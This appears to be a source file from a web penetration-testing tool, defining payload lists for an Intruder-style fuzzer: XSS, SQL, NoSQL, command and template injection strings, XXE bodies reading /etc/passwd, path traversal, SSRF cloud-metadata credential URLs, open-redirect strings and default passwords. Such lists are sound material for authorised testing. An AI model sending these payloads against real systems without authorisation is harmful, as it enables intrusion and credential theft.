#------------------------------------------------------------------------------
# Wyrm — wyrm/security/payloads.py
# Copyright (c) 2023-present ByKh R&D Group. Licensed under the MIT License (see LICENSE).
# Authors: Kim, Oda, Kwan, Naly
#------------------------------------------------------------------------------
"""Built-in payload lists and generators for Intruder: a curated library grouped by category (quick starters,
not exhaustive wordlists). Use only against systems you are authorized to test.

    LISTS       name -> [payload, …]        (flat; every list, for lookup)
    META        name -> one-line description
    CATEGORIES  [(category, [name, …]), …]  ordered, for a grouped menu
    numbers(a, b, step)                      a numeric range as strings"""
from __future__ import annotations

# category -> {list name: (description, [payloads])}. LISTS / META / CATEGORIES are derived from this below.
_LIBRARY: dict[str, dict[str, tuple[str, list[str]]]] = {
    "Injection": {
        "XSS (quick)": ("Reflected/stored XSS breakouts", [
            "<script>alert(1)</script>", "\"'><svg onload=alert(1)>", "'\"><img src=x onerror=alert(1)>",
            "javascript:alert(1)", "<img src=x onerror=alert(1)>", "<body onload=alert(1)>"]),
        "XSS (polyglot)": ("Single strings that fire in many contexts", [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/"
            "</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
            "'\"--></style></script><svg onload=alert(1)>"]),
        "SQL injection (quick)": ("Error/boolean/union probes", [
            "'", "\"", "' OR '1'='1", "' OR 1=1-- -", "') OR ('1'='1", "' UNION SELECT NULL-- -",
            "1' AND '1'='1", "1' AND '1'='2"]),
        "SQL injection (time-based)": ("Blind SQLi delay probes (~5s)", [
            "1' AND SLEEP(5)-- -", "1\" AND SLEEP(5)-- -", "'; WAITFOR DELAY '0:0:5'-- -",
            "1) AND SLEEP(5)-- -", "' AND pg_sleep(5)-- -", "1 AND SLEEP(5)"]),
        "NoSQL injection": ("MongoDB-style operator injection", [
            "' || '1'=='1", "'; return true; var x='", "[$ne]=1", "[$gt]=", "{\"$ne\": null}",
            "{\"$gt\": \"\"}", "admin'||'1'=='1"]),
        "SSTI": ("Template-engine evaluation (7*7)", [
            "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "${{7*7}}", "@(7*7)"]),
        "Command injection": ("OS command separators", [
            ";id", "|id", "&&id", "`id`", "$(id)", "; sleep 5", "| ping -n 5 127.0.0.1", "%0a id"]),
        "LDAP injection": ("LDAP filter breakouts", ["*", "*)(uid=*", "*)(|(uid=*", "admin*", "*)(objectClass=*"]),
        "CRLF injection": ("Header/response splitting", [
            "%0d%0aSet-Cookie:wyrm=1", "%0d%0aX-Injected:1", "\\r\\nX-Injected:1", "%E5%98%8a%E5%98%8dX-Injected:1"]),
        "XXE": ("XML external entity bodies", [
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://INTERACT/xxe\">]><r>&x;</r>"]),
    },
    "Files & paths": {
        "Path traversal": ("Directory traversal (encoded variants)", [
            "../../../../etc/passwd", "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
            "..\\..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"]),
        "LFI / files": ("Local-file-inclusion targets", [
            "/etc/passwd", "../../../../etc/passwd", "C:\\windows\\win.ini", "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php"]),
        "Common files": ("Sensitive files worth probing", [
            "robots.txt", ".git/HEAD", ".env", "web.config", ".htaccess", "backup.zip", "config.php.bak",
            "phpinfo.php", ".DS_Store", "sitemap.xml"]),
        "Common directories": ("Admin / API / infra paths", [
            "admin", "login", "api", "api/v1", "wp-admin", "phpmyadmin", ".git", "actuator", "server-status",
            "dashboard", "console", "debug"]),
    },
    "Redirects & SSRF": {
        "Open redirect": ("Redirect bypass forms", [
            "https://evil.example/", "//evil.example/", "/\\evil.example", "https:evil.example",
            "https://target@evil.example/", "/%09/evil.example"]),
        "SSRF targets": ("Internal/cloud metadata endpoints", [
            "http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/", "http://[::1]/", "http://0.0.0.0/"]),
    },
    "Fuzzing": {
        "Special characters": ("One odd character at a time", [
            "'", "\"", "`", "\\", "<", ">", "{", "}", "|", ";", "%", "&", "$", "\x00", "../", "\n", "\t"]),
        "Format strings": ("printf-style format specifiers", ["%s", "%x", "%n", "%s%s%s%s", "%08x", "{0}", "{{0}}"]),
        "Boolean values": ("Truthy/falsy toggles for logic flaws", [
            "true", "false", "1", "0", "null", "nil", "none", "undefined", "yes", "no", "[]", "{}"]),
    },
    "Auth": {
        "Common usernames": ("Default/admin account names", [
            "admin", "administrator", "root", "test", "user", "guest", "operator", "support", "demo"]),
        "Common passwords": ("Weak/default passwords", [
            "admin", "password", "123456", "admin123", "root", "changeme", "letmein", "P@ssw0rd",
            "welcome", "qwerty", "password1"]),
    },
}

LISTS: dict[str, list[str]] = {}
META: dict[str, str] = {}
CATEGORIES: list[tuple[str, list[str]]] = []
for _cat, _lists in _LIBRARY.items():
    CATEGORIES.append((_cat, list(_lists)))
    for _name, (_desc, _vals) in _lists.items():
        LISTS[_name] = _vals
        META[_name] = _desc


def numbers(a: int, b: int, step: int = 1) -> list[str]:
    if step == 0:
        step = 1
    rng = range(a, b + 1, step) if step > 0 else range(a, b - 1, step)
    return [str(i) for i in rng]
